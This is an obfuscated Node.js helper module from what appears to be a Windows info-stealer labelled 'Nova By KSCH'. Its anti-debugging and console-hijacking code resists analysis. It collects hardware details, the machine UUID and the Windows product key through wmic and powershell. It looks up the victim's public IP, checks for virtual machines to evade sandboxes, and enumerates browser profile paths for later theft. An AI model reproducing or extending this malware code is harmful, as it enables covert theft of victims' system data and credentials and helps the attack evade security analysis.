const _0x1e7a28 = (function () {
    let _0x14d8d9 = true
    return function (_0x57c2f7, _0x54881a) {
      const _0x4c8a97 = _0x14d8d9
        ? function () {
            if (_0x54881a) {
              const _0x546752 = _0x54881a.apply(_0x57c2f7, arguments)
              return (_0x54881a = null), _0x546752
            }
          }
        : function () {}
      return (_0x14d8d9 = false), _0x4c8a97
    }
  })(),
  _0x338d7c = _0x1e7a28(this, function () {
    return _0x338d7c
      .toString()
      .search('(((.+)+)+)+$')
      .toString()
      .constructor(_0x338d7c)
      .search('(((.+)+)+)+$')
  })
_0x338d7c()
const _0x5294cd = (function () {
  let _0x1622da = true
  return function (_0x209e6f, _0x4369bf) {
    const _0x1ef9c5 = _0x1622da
      ? function () {
          if (_0x4369bf) {
            const _0xd28abe = _0x4369bf.apply(_0x209e6f, arguments)
            return (_0x4369bf = null), _0xd28abe
          }
        }
      : function () {}
    return (_0x1622da = false), _0x1ef9c5
  }
})()
;(function () {
  _0x5294cd(this, function () {
    const _0x33dc21 = new RegExp('function *\\( *\\)'),
      _0x2fc929 = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i')
    const _0x16f545 = _0x13504f('init')
    !_0x33dc21.test(_0x16f545 + 'chain') || !_0x2fc929.test(_0x16f545 + 'input')
      ? _0x16f545('0')
      : _0x13504f()
  })()
})()
const _0x4cf70d = (function () {
    let _0x30247d = true
    return function (_0x5d5da7, _0x3437db) {
      const _0x2753b1 = _0x30247d
        ? function () {
            if (_0x3437db) {
              const _0x3bb223 = _0x3437db.apply(_0x5d5da7, arguments)
              return (_0x3437db = null), _0x3bb223
            }
          }
        : function () {}
      return (_0x30247d = false), _0x2753b1
    }
  })(),
  _0x8a6cdf = _0x4cf70d(this, function () {
    let _0x1b65a0
    try {
      const _0x29130e = Function(
        'return (function() {}.constructor("return this")( ));'
      )
      _0x1b65a0 = _0x29130e()
    } catch (_0x219c18) {
      _0x1b65a0 = window
    }
    const _0x40bb06 = (_0x1b65a0.console = _0x1b65a0.console || {}),
      _0xceaa43 = [
        'log',
        'warn',
        'info',
        'error',
        'exception',
        'table',
        'trace',
      ]
    for (let _0x3ee77b = 0; _0x3ee77b < _0xceaa43.length; _0x3ee77b++) {
      const _0xe55126 = _0x4cf70d.constructor.prototype.bind(_0x4cf70d),
        _0x20f0e5 = _0xceaa43[_0x3ee77b],
        _0x681d86 = _0x40bb06[_0x20f0e5] || _0xe55126
      _0xe55126['__proto__'] = _0x4cf70d.bind(_0x4cf70d)
      _0xe55126.toString = _0x681d86.toString.bind(_0x681d86)
      _0x40bb06[_0x20f0e5] = _0xe55126
    }
  })
_0x8a6cdf()
const _0xae7c3e = require('fs'),
  _0x17fe73 = require('axios'),
  _0x343832 = require('util'),
  _0x2b0035 = _0x343832.promisify(require('child_process').exec)
function _0x4ae4a4(_0x3e897b) {
  var _0x3acc62 = ''
  var _0x423400 =
    'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
  for (var _0x1d11a7 = 0; _0x1d11a7 < _0x3e897b; _0x1d11a7++) {
    _0x3acc62 += _0x423400.charAt(Math.floor(Math.random() * _0x423400.length))
  }
  return _0x3acc62
}
function _0x3512fe(_0x162049) {
  return _0x162049.split('\\').pop().split('/').pop()
}
function _0x279b5b(_0x206ad9, _0xeb5c42) {
  var _0x1d238a = []
  !_0x206ad9.endsWith('\\') && (_0x206ad9 += '\\')
  const _0x1b1f7b = _0xae7c3e.readdirSync(_0x206ad9)
  for (var _0x551fff = 0; _0x551fff < _0x1b1f7b.length; _0x551fff++) {
    const _0x518282 = _0x1b1f7b[_0x551fff],
      _0x3c41db = _0x206ad9 + _0x518282
    _0xae7c3e.statSync(_0x3c41db).isDirectory()
      ? (_0x1d238a = _0x1d238a.concat(
          _0x279b5b(_0x3c41db, _0xeb5c42 + _0x518282 + '\\')
        ))
      : _0x1d238a.push(_0xeb5c42 + _0x518282)
  }
  return _0x1d238a
}
function _0x2cfb4b(_0x3ec25d, _0x231caf) {
  const _0xf1e410 = _0x3ec25d.split('%PROFILE%')
  if (_0xf1e410.length == 1) {
    return [
      {
        path: _0x3ec25d,
        name: _0x231caf,
      },
    ]
  }
  if (!_0xae7c3e.existsSync(_0xf1e410[0])) {
    return []
  }
  var _0x580c1b = _0xae7c3e.readdirSync(_0xf1e410[0])
  var _0x3132ac = []
  for (var _0x289cb5 = 0; _0x289cb5 < _0x580c1b.length; _0x289cb5++) {
    var _0x28d13f = _0x580c1b[_0x289cb5]
    _0xae7c3e.existsSync(_0xf1e410[0] + _0x28d13f + _0xf1e410[1]) &&
      _0x3132ac.push({
        path: _0xf1e410[0] + _0x28d13f + _0xf1e410[1],
        profile: _0x231caf + ' ' + _0x28d13f,
      })
  }
  return _0x3132ac
}
async function _0x3c5950() {
  let _0x5960b9 = ''
  try {
    _0x5960b9 = await _0x42313b(
      'wmic computersystem get totalphysicalmemory | more +1'
    )
  } catch (_0x564b70) {
    _0x564b70 && (_0x5960b9 = 4)
  }
  return parseInt(Math.floor(parseInt(_0x5960b9) / 1073741824))
}
async function _0x402aee() {
  let _0xfaf0cf = (await _0x42313b('wmic logicaldisk get size')).split(' ')
  for (let _0x32ed73 of _0xfaf0cf) {
    if (_0x32ed73.trim() !== '' && _0x32ed73.trim().toLowerCase() !== 'size') {
      return Math.floor(parseInt(_0x32ed73) / 1073741824).toString()
    }
  }
  return '1000'
}
async function _0x125ad3() {
  let _0xd103a1 = await _0x42313b('wmic csproduct get uuid')
  let _0x33db1c = _0xd103a1.match(/UUID\s+([A-Fa-f0-9-]+)/)
  let _0x52782a = _0x33db1c[1]
  return _0x52782a
}
async function _0x42313b(_0x261e81) {
  const { stdout: _0x2a70e3, _: _0x53e1e0 } = await _0x2b0035(_0x261e81)
  return _0x2a70e3.trim()
}
async function _0x1eca5f() {
  let _0x5ee9a8 = ''
  try {
    _0x5ee9a8 = await _0x42313b('echo %NUMBER_OF_PROCESSORS%')
  } catch (_0x4f1c47) {
    _0x4f1c47 && (_0x5ee9a8 = 4)
  }
  return _0x5ee9a8
}
async function _0x4199cc() {
  try {
    const [
      _0x49486f,
      _0x470f5a,
      _0x7a34fa,
      _0x24addd,
      _0x5cc67c,
      _0x248baf,
      _0x473664,
      _0xe44dbd,
      _0x45acdf,
    ] = await Promise.all([
      _0x402aee(),
      _0x3c5950(),
      _0x125ad3(),
      _0x1eca5f(),
      await _0x42313b('wmic OS get caption, osarchitecture | more +1'),
      await _0x42313b('wmic cpu get name | more +1'),
      await _0x42313b('wmic PATH Win32_VideoController get name | more +1'),
      await _0x42313b(
        "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault"
      ),
      await _0x42313b(
        "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName"
      ),
    ])
    return {
      disk: _0x49486f,
      ram: _0x470f5a,
      uid: _0x7a34fa,
      cpucount: _0x24addd,
      OS: _0x5cc67c,
      cpu: _0x248baf,
      GPU: _0x473664,
      windowskey: _0xe44dbd,
      windowsversion: _0x45acdf,
    }
  } catch (_0x5bfa9a) {
    if (_0x5bfa9a) {
      return {
        disk: 'None',
        ram: 'None',
        uid: 'None',
        cpucount: 'None',
        OS: 'None',
        cpu: 'None',
        GPU: 'None',
        windowskey: 'None',
        windowsversion: 'None',
      }
    }
  }
}
async function _0x3f5a34() {
  var _0xdd2ae9 = ''
  try {
    const _0x54e51f = await _0x17fe73({
      url: 'https://ipinfo.io/json',
      method: 'GET',
    })
    _0xdd2ae9 = _0x54e51f.data
    if (_0xdd2ae9.length > 16) {
      return 'Failed!'
    }
    return _0xdd2ae9
  } catch (_0x49364f) {
    return 'Failed!'
  }
}
async function _0xa92fc3() {
  const { stdout: _0x1e1cbf, _: _0x2e4eae } = await _0x2b0035(
    'powershell -c "Get-WmiObject -Query \\"Select * from Win32_CacheMemory\\""'
  )
  if (
    _0x1e1cbf.replace(/\r/gm, '').replace(/\n/gm, '').replace(/ /gm, '') == ''
  ) {
    return true
  }
  return false
}
function _0x283d46() {
  return '\t\tNova By KSCH | https://github.com/FalseKSCH\n\n\n\n'
}
module.exports = {
  generateId: _0x4ae4a4,
  fileName: _0x3512fe,
  recursiveRead: _0x279b5b,
  getProfiles: _0x2cfb4b,
  getPublicIp: _0x3f5a34,
  isVm: _0xa92fc3,
  getHeader: _0x283d46,
  getInfo: _0x4199cc,
}
function _0x13504f(_0x198d78) {
  function _0x55e784(_0x1cd601) {
    if (typeof _0x1cd601 === 'string') {
      return function (_0x4875fa) {}
        .constructor('while (true) {}')
        .apply('counter')
    } else {
      ;('' + _0x1cd601 / _0x1cd601).length !== 1 || _0x1cd601 % 20 === 0
        ? function () {
            return true
          }
            .constructor('debugger')
            .call('action')
        : function () {
            return false
          }
            .constructor('debugger')
            .apply('stateObject')
    }
    _0x55e784(++_0x1cd601)
  }
  try {
    if (_0x198d78) {
      return _0x55e784
    } else {
      _0x55e784(0)
    }
  } catch (_0x5ef5a7) {}
}
